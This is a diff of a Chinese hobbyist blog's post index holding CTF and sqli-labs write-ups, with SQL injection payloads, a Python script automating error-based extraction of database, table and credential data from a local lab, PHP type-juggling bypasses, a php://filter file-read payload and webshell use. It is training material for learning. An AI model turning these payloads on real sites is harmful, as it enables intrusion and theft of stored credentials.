+<p>（0x7e相当于’~’）</p>
+<blockquote>
+<p><strong>concat()函数</strong></p>
+<p>功能：将多个字符串连接成一个字符串。</p>
+<p>语法：concat(str1, str2,…)</p>
+<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
+<p>举例：</p>
+<p>select concat (id, name, score) as info from tt2;</p>
+<p><strong>concat_ws()函数</strong></p>
+<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
+<p>语法：concat_ws(separator, str1, str2, …)</p>
+<p><strong>group_concat()函数</strong></p>
+<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
+<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )</p>
+<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
+</blockquote>
+<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><img src="/2020/10/18/sqlilab/image-20201017183527723.png" alt="image-20201017183527723" style="zoom:67%;">
+
+<img src="/2020/10/18/sqlilab/image-20201017183732804.png" alt="image-20201017183732804" style="zoom:67%;">
+
+<p>与less -1的报错进行对比，发现多了一个<code>）</code>，查看源码：</p>
+<img src="/2020/10/18/sqlilab/1675852-20190518222124348-899747284.png" alt="img" style="zoom:67%;">
+
+<p><strong>构造id=-1’)</strong></p>
+<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><p>?id=1’没有报错，试了下?id=1”,报错如下：</p>
+<blockquote>
+<p>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use <strong>near ‘“2””)</strong> LIMIT 0,1’ at  line 1</p>
+</blockquote>
+<pre><code class="line-numbers language-php">$id = '"' . $id . '"';
+$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
+</code></pre>
+<p>查看源码，发现它在进行SQL查询前好像还做了个给id赋值的操作，测试一下这个到底会对id进行怎样的操作：</p>
+<pre><code class="line-numbers language-php">&lt;?php
+$id=1;
+$id = '"' . $id . '"';
+echo($id);            //"1"
+</code></pre>
+<p>我们看见执行的结果是”1” 可以得知原来这个语法是个id参数加了两个双引号 并且还是右括号的注入 </p>
+<p>构造**?id=-1”)** </p>
+<h4 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘’1’’</strong> LIMIT 0,1’  at line 1</p>
+<pre><code class="line-numbers language-python">import requests
+from bs4 import BeautifulSoup
+db_name = ''
+table_list = []
+column_list = []
+url = '''http://127.0.0.1/sqli-labs-master/Less-5/?id=1'''
+### 获取当前数据库名 ###
+print('当前数据库名:')
+payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
+r = requests.get(url+payload)
+db_name = r.text.split(':')[-2]
+print('[+]' + db_name)
+### 获取表名 ###
+print('数据库%s下的表名:' % db_name)
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
+    r = requests.get(url+payload)
+    if 'group_key' not in r.text:
+        break
+    table_name = r.text.split(':')[-2]
+    table_list.append(table_name)
+    print('[+]' + table_name)
+### 获取列名 ###
+#### 这里以users表为例 ####
+print('%s表下的列名:' % table_list[-1])  ###根据我的摸索，里面的数字应该表示顺序，-1表示的应该是倒数第一个，0应该表示第一个
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select column_name from information_schema.columns where table_name='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    column_name = r.text.split(':')[-2]
+    column_list.append(column_name)
+    print('[+]' + column_name)
+### 获取字段值 ###
+#### 这里以username列为例 ####
+print('%s列下的字段值:' % column_list[-2])
+for i in range(50):
+    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select %s from %s.%s limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (column_list[-2],db_name,table_list[-1],i)
+    r = requests.get(url + payload)
+    if 'group_key' not in r.text:
+        break
+    dump = r.text.split(':')[-2]
+    print('[+]' + dump)
+</code></pre>
+<h4 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘“1””</strong> LIMIT 0,1’  at line 1</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>SQL注入</tag>
       </tags>
   </entry>
   <entry>
@@ -5018,398 +5410,6 @@ class Solution {
       </tags>
   </entry>
   <entry>
-    <title>Vscode_Error</title>
-    <url>/2023/08/06/Vscode-Error/</url>
-    <content><![CDATA[<h3 id="一、问题概述"><a href="#一、问题概述" class="headerlink" title="一、问题概述"></a>一、问题概述</h3><blockquote>
-<p>vscode 获取扩展失败，XHR failed</p>
-</blockquote>
-<p>平时vscode只是用来跑一跑C/C++代码，最近想装一个插件的时候在插件商店搜索的时候却报错XHR failed，然后在网上查了查，似乎是连不上网，可能是代理出了问题。这才想起来似乎vscode好久没有给我推过版本更新或者推荐插件什么的了，可能是无法联网的原因。</p>
-<h3 id="二、解决方法"><a href="#二、解决方法" class="headerlink" title="二、解决方法"></a>二、解决方法</h3><p>网上的解决方法是修改vscode里的设置，将代理移除，但是我按照这种方法并不奏效。</p>
-<p><a href="https://blog.csdn.net/SUDA196/article/details/127104495">Win10解决vscode获取扩展失败，XHR failed（亲测可以解决）_苏打不会碱的博客-CSDN博客</a></p>
-<p>后来在查找解决方法的时候偶然发现了这篇文章：</p>
-<p><a href="https://www.cnblogs.com/joyzen/p/13815384.html">VS Code代理设置错误 - 许你一世煙花 - 博客园 (cnblogs.com)</a></p>
-<p>里面提到：</p>
-<blockquote>
-<p>VS Code会去读取系统变量HTTP_PROXY的值设置为代理地址，去查了下系统环境变量设置里面果真有这个变量，删除后即可解决VS Code商店连不上的问题</p>
-</blockquote>
-<p>按照他的方法我确实在电脑上找到了HTTP＿PROXY（我的是小写）这个系统变量，并且它的值是127.0.0.1:32100(可能是这样，删的果断了点没太记住)。按道理来说我的代理的端口是7890，显然他这里的端口值不太对，我没有去修改而是直接删除了这个变量。</p>
-<p>删除后我尝试重启vscode，试了下发现还是连不上网，发现是因为我的vscode设置中设置了代理<code>http://127.0.0.1:7890</code>，但是我此时并没有开启代理，将代理开启后就可以正常联网了。</p>
-<p><img src="https://aband0n.oss-cn-nanjing.aliyuncs.com/img/image-20230806154211788.png" alt="image-20230806154211788"></p>
-<p>当然，如果不想开代理的话就将上面的<code>http://127.0.0.1:7890</code>删除，这样不开代理的情况下也可以正常联网。</p>
-<h3 id="三、意外收获"><a href="#三、意外收获" class="headerlink" title="三、意外收获"></a>三、意外收获</h3><p>上面那篇文章中还提到了一点：</p>
-<blockquote>
-<p>同时还发现HTTP_PROXY这个环境变量还被被其他软件环境读取作为代理地址，比如yarn，造成依赖下载被代理到指定地址导致失败。</p>
-</blockquote>
-<p>其他软件也会读取HTTP_PROXY这个环境变量作为代理地址，突然想起之前自己电脑在使用群晖chat（Synology chat）的时候客户端一直无法正常登录，但是使用虚拟机或者其他人的电脑就可以正常登录，很奇怪，当时怀疑是自己电脑某个端口或者设置导致的，但是在网上搜索了很久都没有找到解决方案，一直搁置，使用的网页版。</p>
-<p>所以我突然想到会不会当时无法登录也是因为这个环境变量呢？抱着试一试的心态打开客户端登录了一下，发现居然登陆成功了！害人不浅啊这个环境变量！<span class="github-emoji"><span>😭</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-<p>所以如果你有某些软件一直登录不成功，不妨也检查一下自己的环境变量。</p>
-]]></content>
-      <categories>
-        <category>技术</category>
-      </categories>
-      <tags>
-        <tag>Vscode</tag>
-        <tag>Synology</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>YCBCTF wp</title>
-    <url>/2020/09/10/YCBCTF/</url>
-    <content><![CDATA[<p>“羊城杯”，开学后打的一场比赛，由于我实在是太菜了，只会写第一题<span class="github-emoji"><span>😭</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f62d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-<span id="more"></span>
-
-<p>尝试访问一波index.php，页面出现<code>eval post cmd</code>,貌似是一句话木马。</p>
-<img src="/2020/09/10/YCBCTF/image-20200910224747632.png" alt="image-20200910224747632" style="zoom:50%;">
-
-
-
-<p>尝试用蚁剑连接一下，密码试一下cmd,连接成功！</p>
-<img src="/2020/09/10/YCBCTF/image-20200910224833992.png" alt="image-20200910224833992" style="zoom:50%;">
-
-
-
-<p>并没有找到flag.php或者含flag字样的东西，倒是发现一个bbbbbbbbb.txt，十分可疑，下载后打开发现是一堆奇奇怪怪的字符。想到可能是图片编码，尝试反向解码。找一个解码网站，将txt中的内容复制进去，显示格式错误。后来了解到要解码还得在前面加上一小串东西：<strong>data:image/jpg;base64,</strong>    解码成功！flag就在图片中，奇怪的知识又增加了<span class="github-emoji"><span>😄</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f604.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>。</p>
-<p><img src="/2020/09/10/YCBCTF/image-20200910224632204.png" alt="image-20200910224632204"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>CTF</tag>
-        <tag>web</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo matery主题代码高亮问题</title>
-    <url>/2020/09/26/hexo/</url>
-    <content><![CDATA[<p>关于matery主题代码高亮的问题</p>
-<p>转载自大佬们的博客:</p>
-<p><a href="https://www.jianshu.com/p/f395d92a1110">Hexo博客：六、prism代码高亮</a></p>
-<p><a href="https://blog.csdn.net/zemprogram/article/details/104421008">个人博客搭建笔记—-hexo主题代码高亮</a></p>
-]]></content>
-      <categories>
-        <category>Hexo</category>
-      </categories>
-      <tags>
-        <tag>hexo</tag>
-        <tag>代码高亮</tag>
-        <tag>matery</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>MoeCTF wp</title>
-    <url>/2020/08/14/moectf/</url>
-    <content><![CDATA[<img src="/2020/08/14/moectf/image-20200816135721888.png" alt="image-20200816135721888" style="zoom:50%;">
-
-<p>MoeCTF，西安电子科技大学的新生赛，作为一个南邮的小菜鸡，成功通过wh1sper师傅提供的后门混入其中<span class="github-emoji"><span>😉</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f609.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，借此锻炼锻炼自己的能力，同时也为0xGame做准备。冲冲冲！</p>
-<span id="more"></span>
-
-<h4 id="1-GET"><a href="#1-GET" class="headerlink" title="1.GET"></a>1.GET</h4><p>这是一道简单的get传参的题，直接在url里传a这个参数<code>?a=flag</code>，即可得到flag</p>
-<hr>
-<h4 id="2-POST"><a href="#2-POST" class="headerlink" title="2.POST"></a>2.POST</h4><p>这是一道简单的post传参的题，利用hackbar（火狐浏览器的插件，不了解的话可自行百度一下，安装啥的不难的）即可传参，或者利用bp应该也是一样的。</p>
-<img src="/2020/08/14/moectf/image-20200814140353992.png" alt="image-20200814140353992" style="zoom:50%;">
-
-<hr>
-<h4 id="3-小饼干"><a href="#3-小饼干" class="headerlink" title="3.小饼干"></a>3.小饼干</h4><p>进入页面发现是一个空页面，这时候想到利用bp抓包，观察</p>
-<img src="/2020/08/14/moectf/image-20200814140801922.png" alt="image-20200814140801922" style="zoom: 67%;">
-
-<p>发现类似flag的东西。复制提交，发现就是正确的flag</p>
-<hr>
-<h4 id="4-Introduction"><a href="#4-Introduction" class="headerlink" title="4.Introduction"></a>4.Introduction</h4><p>这个题点进去的话就是很正常的对<strong>moectf</strong>的介绍，点进去源码也没看到flag     (好吧，是我眼瞎，后来才发现flag就在源码里)  尝试抓包，也没找到</p>
-<img src="/2020/08/14/moectf/image-20200814142428514.png" alt="image-20200814142428514" style="zoom: 67%;">
-
-<p>考的是眼力<span class="github-emoji"><span>👿</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f47f.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-<hr>
-<h4 id="5-一句话木马"><a href="#5-一句话木马" class="headerlink" title="5.一句话木马"></a>5.一句话木马</h4><p>进入题目，发现源码就是一句话木马</p>
-<img src="/2020/08/14/moectf/image-20200814142846791.png" alt="image-20200814142846791">
-
-<p>话不多说，直接掏出俺的<strong>蚁剑</strong></p>
-<img src="/2020/08/14/moectf/image-20200814143147631.png" alt="image-20200814143147631" style="zoom: 50%;">
-
-<p>这边的话要注意的就是连接密码一定别忘记，<strong>密码就是post后面单引号里的内容</strong>。</p>
-<img src="/2020/08/14/moectf/image-20200814143913525.png" alt="image-20200814143913525" style="zoom: 50%;">
-
-<p>连接成功！一般情况下flag就在根目录/下，去到这道题的根目录下的确发现了flag。</p>
-<hr>
-<h4 id="6-ezmath"><a href="#6-ezmath" class="headerlink" title="6.ezmath"></a>6.ezmath</h4><p>等待填坑</p>
-<hr>
-<h4 id="7-三心二意"><a href="#7-三心二意" class="headerlink" title="7.三心二意"></a>7.三心二意</h4><p>根据hint及观察代码，这应该是一道考察php弱类型相等的题。</p>
-<pre><code class="line-numbers language-php">&lt;?php
-$a = $_GET['a'];
-$b = $_POST['b'];
-$c = $_REQUEST['c'];
-$d = $_COOKIE['d'];
-
-if (!isset($a, $b, $c, $d)) {
-    highlight_file(__FILE__);
-} else {
-    if (is_numeric($a) and $a == false) {
-        echo 'A is OK!';
-        echo '&lt;br/&gt;';
-        if (!is_numeric($b) and $b == 0x125e591) {
-            echo 'B is OK!';
-            echo '&lt;br/&gt;';
-            if ($c != 240610708 and md5($c) == md5(240610708)) {
-                echo 'C is OK!';
-                echo '&lt;br/&gt;';
-                if (strlen($d) &lt; 7 and $d != 0 and $d ** 2 == 0) {
-                    include('/flag');
-                } else {
-                    echo "D is not wanted.&lt;br/&gt;";
-                    highlight_file(__FILE__);
-                }
-            } else {
-                echo "C is not wanted.&lt;br/&gt;";
-                highlight_file(__FILE__);
-            }
-        } else {
-            echo "Too young too simple.&lt;br/&gt;";
-            highlight_file(__FILE__);
-        }
-    } else {
-        echo "A is not wanted.&lt;br/&gt;";
-        highlight_file(__FILE__);
-    }
-} 
-</code></pre>
-<p>u1s1,我刷题的确太少了，对于题目中的几个判断都不是很熟悉，不知道怎么去绕过，一个一个做解释吧<span class="github-emoji"><span>😢</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-<ul>
-<li><code>is_numeric($a) and $a == false</code></li>
-</ul>
-<p>此处涉及到**is_numeric()**这个php函数,<strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串,如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE。</p>
-<p>也就是说上面这个语句要求a参数是一个数字或字符串，且==false，那挺简单的，0或者null都可以，尝试?a=0,回车一下发现没反应，仔细看源码才发现他要a,b,c,d四个变量都存在才行。</p>
-<ul>
-<li><p><code>!is_numeric($b) and $b == 0x125e591</code></p>
-<p>这个语句的要求是b变量不是数字或字符串并且b==0x125e591，关于0x125e591，我也不太清楚他是个啥，看起来像16进制，百度一波</p>
-<img src="/2020/08/14/moectf/image-20200921134750652.png" alt="image-20200921134750652" style="zoom:50%;">
-
-<p>好家伙！直接给我转换出来了。没错了，0x125e591是16进制，转成10进制就是19260817。</p>
-<blockquote>
-<p>php有两种比较方式,一种是“= =”一种是“= = =”</p>
-<p>“= =”：会把两端变量类型转换成相同的，再进行比较。</p>
-<p>“= = =”：会先判断两端变量类型是否相同，再进行比较。</p>
-<p>这里明确说明，<strong>在两个相等的符号中，一个字符串与一个数字相比较时，字符串会转换成数值</strong>。</p>
-<p>当一个字符串被当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内，该字符串被当作int来取值。其他所有情况下都被作为float来取值，<strong>该字符串的 开始部分 决定了它的值，如果该字符串以合法的数值开始，则使用该数值， 否则其值为0 。</strong></p>
-<p>在进行比较运算时，如果遇到了 0e 这类字符串，PHP会将它解析为 科学计数法</p>
-<p>在进行比较运算时，如果遇到了 0x 这类字符串，PHP会将它解析为 十六进制 。</p>
-</blockquote>
-<p>然后经过大佬指点和我的测试，我发现只需要在19260817后面加上字母就行了<span class="github-emoji"><span>😸</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f638.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-</li>
-<li><p><code>$c != 240610708 and md5($c) == md5(240610708)</code></p>
-<p>这个的话主要是md5值的知识，上网一查，md5(‘240610708’)等于md5(‘QNKCDZO’)，于是直接吧c赋值成后面那个字符串。</p>
-</li>
-<li><p><code>strlen($d) &lt; 7 and $d != 0 and $d ** 2 == 0</code></p>
-<p>这个一开始是真的不会，后来还是一个学弟教我的，害。</p>
-<p>考点应该是<strong>md5()函数无法处理数组，如果传入的为数组，会返回NULL</strong>（之前应该遇到过，忘记了。。。）</p>
-<p>所以此处将d赋值成<code>d[]=0</code>,妙啊。</p>
-<p>所以最终传参如下：</p>
-<img src="/2020/08/14/moectf/image-20200921143630484.png" alt="image-20200921143630484" style="zoom:67%;"></li>
-</ul>
-<p>再贴一道与这道题很像的题：（来自CNSS）</p>
-<pre><code class="line-numbers language-php">&lt;?php
-highlight_file(__FILE__);
-$a = $_GET['a'];
-$b = $_POST['b'];
-$c = $_REQUEST['c'];
-$d = $_COOKIE['d'];
-
-if (isset($a) &amp;&amp; !is_numeric($a) &amp;&amp; $a == 114514) {
-    echo "A is ok!";
-    if (isset($b) &amp;&amp; $b != 0 &amp;&amp; $b ** 2 == 0) {
-        echo "B is ok!";
-        if (isset($c) &amp;&amp; isset($d) &amp;&amp; $c !== $d &amp;&amp; md5($c) === md5($d)) {
-            echo "C is ok!";
-            echo "Here is your flag:";
-            include('/flag');
-        } else {
-            die((isset($c) &amp;&amp; isset($d)) ? "Try to search something?" : "C and D is wanted.");
-        }
-    } else {
-        die(isset($b) ? "You need to try again." : "B is wanted.");
-    }
-} else {
-    die(isset($a) ? "Please try another a." : "A is wanted.");
-} 
-</code></pre>
-<hr>
-<h4 id="8-俄罗斯头套"><a href="#8-俄罗斯头套" class="headerlink" title="8.俄罗斯头套"></a>8.俄罗斯头套</h4><img src="/2020/08/14/moectf/image-20200814145058030.png" alt="image-20200814145058030" style="zoom:67%;">
-
-<p>点进去后发现这样一句话，觉得应该得<strong>burpsuits</strong>伪造一波ip地址</p>
-<p><img src="/2020/08/14/moectf/image-20200814145154603.png" alt="image-20200814145154603"></p>
-<p>抓包后添加 <strong>X-Forwarded-For</strong>头，伪造一波ip地址，send一下，得到如下页面</p>
-<img src="/2020/08/14/moectf/image-20200814145736400.png" alt="image-20200814145736400" style="zoom:50%;">
-
-<p>然后注意到response里说我得是从<a href="https://www.baidu.com来的，根据之前的做题经验的话，再添加一个**Referer**头即可，如下：">https://www.baidu.com来的，根据之前的做题经验的话，再添加一个**Referer**头即可，如下：</a></p>
-<img src="/2020/08/14/moectf/image-20200814150025874.png" alt="image-20200814150025874" style="zoom:50%;">
-
-<p>发现<strong>response</strong>里又要求使用Post请求，这个之前的确没遇到过，观察了一波现有的头，发现第一个头是Get，尝试将其修改为Post后send一波，得到如下信息：</p>
-<img src="/2020/08/14/moectf/image-20200814150414403.png" alt="image-20200814150414403" style="zoom:50%;">
-
-<p>好吧，没完了，不愧是俄罗斯头套<span class="github-emoji"><span>😢</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f622.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>  不过supreme浏览器是什么鬼，我去百度了一波，靠，好像还真有这个浏览器，不会吧，不会吧，不会要去用这个浏览器去解题吧，那样还得重新配置<strong>burpsuits</strong>.</p>
-<p>我去百度了一波burpsuits里浏览器是由哪个头去表示的，发现是由user-Agent去决定的，</p>
-<img src="/2020/08/14/moectf/image-20200814150944737.png" alt="image-20200814150944737" style="zoom:50%;">
-
-<p>仔细看了看burpsuits里那个头的内容，发现了一个Firefox，盲猜指的是所用的firefox浏览器，尝试将它改为题目中要求的supreme浏览器， 成功！</p>
-<hr>
-<h4 id="9-Moe-include"><a href="#9-Moe-include" class="headerlink" title="9.Moe include"></a>9.Moe include</h4><p>看这题目标题，应该和文件包含漏洞有关，点进去看一下：</p>
-<p><img src="/2020/08/14/moectf/image-20200816140535894.png" alt="image-20200816140535894"></p>
-<p>让我别点，那一定得点一下了<span class="github-emoji"><span>😝</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f61d.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-<img src="/2020/08/14/moectf/image-20200816140646912.png" alt="image-20200816140646912" style="zoom: 67%;">
-
-<p>发现回显的页面为空，但是注意到url里多了一个<code>?file=hint.php</code></p>
-<p>hint是提示的意思，访问hint.php试试，回显的依旧是空页面，抓包看看：</p>
-<img src="/2020/08/14/moectf/image-20200816141033076.png" alt="image-20200816141033076" style="zoom:67%;">
-
-<p>看到注释：<strong>你知道php伪协议吗？</strong></p>
-<p>不知道的话可以参考参考这篇博客：<a href="https://www.cnblogs.com/zzjdbk/p/13030717.html"></a><a href="https://www.cnblogs.com/zzjdbk/p/13030717.html">php伪协议总结</a></p>
-<p>文件包含直接读取的是文件，而不是文件源码，所以要想办法读取源码.结合之前的做题经验，尝试了一下用<code>php://filter</code>去读取文件</p>
-<p>尝试构造如下paylaod:<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code></p>
-<img src="/2020/08/14/moectf/image-20200816142441015.png" alt="image-20200816142441015" style="zoom:67%;">
-
-<p>然后对得到的字符串进行base64解密即可得到flag.<span class="github-emoji"><span>😎</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f60e.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span></p>
-<hr>
-<h4 id="10-Moe-unserialize"><a href="#10-Moe-unserialize" class="headerlink" title="10.Moe unserialize"></a>10.Moe unserialize</h4><p>等待填坑</p>
-<hr>
-<h4 id="11-EzXXE"><a href="#11-EzXXE" class="headerlink" title="11.EzXXE"></a>11.EzXXE</h4><p>等待填坑</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>sqli-labs-master 刷题记录</title>
-    <url>/2020/10/18/sqlilab/</url>
-    <content><![CDATA[<h3 id="注入的分类"><a href="#注入的分类" class="headerlink" title="注入的分类"></a>注入的分类</h3><p>注入的分类：数字型和字符型。攻击者目的只有一点，那就是绕过程序的限制，使用户输入的数据带入数据库执行，利用数据库的特殊性获取更多的信息或者更大的权限。</p>
-<h4 id="1、数字型注入"><a href="#1、数字型注入" class="headerlink" title="1、数字型注入"></a>1、数字型注入</h4><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p>
-<p>测试步骤：</p>
-<p>（1） 加单引号，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a>’</p>
-<p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p>
-<p>（2） 加and 1=1 ,URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=1</p>
-<p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p>
-<p>（3） 加and 1=2，URL：<a href="http://www.text.com/text.php?id=3">www.text.com/text.php?id=3</a> and 1=2</p>
-<p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p>
-<p>如果满足以上三点，则可以判断该URL存在数字型注入。</p>
-<h4 id="2、字符型注入"><a href="#2、字符型注入" class="headerlink" title="2、字符型注入"></a>2、字符型注入</h4><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p>
-<p>例如数字型语句：select * from table where id =3</p>
-<p>则字符型如下：select * from table where name=’admin’</p>
-<p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p>
-<p>测试步骤：</p>
-<p>（1） 加单引号：select * from table where name=’admin’’</p>
-<p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p>
-<p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p>
-<p>Mysql 有三种常用注释符：</p>
-<p>– 注意，这种注释符后边有一个空格</p>
-<p># 通过#进行注释 即**%23**</p>
-<p>/* */ 注释掉符号内的内容</p>
-<p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p>
-<h3 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h3><p>查看有多少列：</p>
-<p><code>?id=1 order by 3--+</code></p>
-<p>查看所有的数据库：</p>
-<p><code>?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+</code></p>
-<p>查看所有的表：</p>
-<p><code>?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x7365637572697479--+</code>  （<strong>0x7365637572697479对应的字符串是security</strong>）</p>
-<p>查看所有的字段：</p>
-<p><code>?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273--+</code>     (<strong>0x7573657273对应的字符串是users</strong>)</p>
-<p>查看所有用户名和密码：</p>
-<p><code>union select 1,2,group_concat(concat_ws(0x7e,username,password)) from security.users --+</code></p>
-<p>（0x7e相当于’~’）</p>
-<blockquote>
-<p><strong>concat()函数</strong></p>
-<p>功能：将多个字符串连接成一个字符串。</p>
-<p>语法：concat(str1, str2,…)</p>
-<p>返回结果为连接参数产生的字符串，如果有任何一个参数为null，则返回值为null。</p>
-<p>举例：</p>
-<p>select concat (id, name, score) as info from tt2;</p>
-<p><strong>concat_ws()函数</strong></p>
-<p>功能：和concat()一样，将多个字符串连接成一个字符串，但是可以一次性指定分隔符～（concat_ws就是concat with separator）</p>
-<p>语法：concat_ws(separator, str1, str2, …)</p>
-<p><strong>group_concat()函数</strong></p>
-<p>功能：将group by产生的同一个分组中的值连接起来，返回一个字符串结果。</p>
-<p>语法：group_concat( [distinct] 要连接的字段 [order by 排序字段 asc/desc  ] [separator ‘分隔符’] )</p>
-<p>说明：通过使用distinct可以排除重复值；如果希望对结果中的值进行排序，可以使用order by子句；separator是一个字符串值，缺省为一个逗号。</p>
-</blockquote>
-<h4 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h4><img src="/2020/10/18/sqlilab/image-20201017183527723.png" alt="image-20201017183527723" style="zoom:67%;">
-
-<img src="/2020/10/18/sqlilab/image-20201017183732804.png" alt="image-20201017183732804" style="zoom:67%;">
-
-<p>与less -1的报错进行对比，发现多了一个<code>）</code>，查看源码：</p>
-<img src="/2020/10/18/sqlilab/1675852-20190518222124348-899747284.png" alt="img" style="zoom:67%;">
-
-<p><strong>构造id=-1’)</strong></p>
-<h4 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h4><p>?id=1’没有报错，试了下?id=1”,报错如下：</p>
-<blockquote>
-<p>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use <strong>near ‘“2””)</strong> LIMIT 0,1’ at  line 1</p>
-</blockquote>
-<pre><code class="line-numbers language-php">$id = '"' . $id . '"';
-$sql="SELECT * FROM users WHERE id=($id) LIMIT 0,1";
-</code></pre>
-<p>查看源码，发现它在进行SQL查询前好像还做了个给id赋值的操作，测试一下这个到底会对id进行怎样的操作：</p>
-<pre><code class="line-numbers language-php">&lt;?php
-$id=1;
-$id = '"' . $id . '"';
-echo($id);            //"1"
-</code></pre>
-<p>我们看见执行的结果是”1” 可以得知原来这个语法是个id参数加了两个双引号 并且还是右括号的注入 </p>
-<p>构造**?id=-1”)** </p>
-<h4 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h4><p>You have  an error in your SQL syntax; check the manual that corresponds to your  MySQL server version for the right syntax to use <strong>near ‘’1’’</strong> LIMIT 0,1’  at line 1</p>
-<pre><code class="line-numbers language-python">import requests
-from bs4 import BeautifulSoup
-db_name = ''
-table_list = []
-column_list = []
-url = '''http://127.0.0.1/sqli-labs-master/Less-5/?id=1'''
-### 获取当前数据库名 ###
-print('当前数据库名:')
-payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select database()),0x3a,floor(rand(0)*2)))--+'''
-r = requests.get(url+payload)
-db_name = r.text.split(':')[-2]
-print('[+]' + db_name)
-### 获取表名 ###
-print('数据库%s下的表名:' % db_name)
-for i in range(50):
-    payload = '''' and 1=(select count(*) from information_schema.columns group by concat(0x3a,(select table_name from information_schema.tables where table_schema='%s' limit %d,1),0x3a,floor(rand(0)*2)))--+''' % (db_name,i)
-    r = requests.get(url+payload)
-    if 'group_key' not in r.text:
-        break
-    table_name = r.text.split(':')[-2]
-    table_list.append(table_name)
-    print('[+]' + table_name)
-### 获取列名 ###
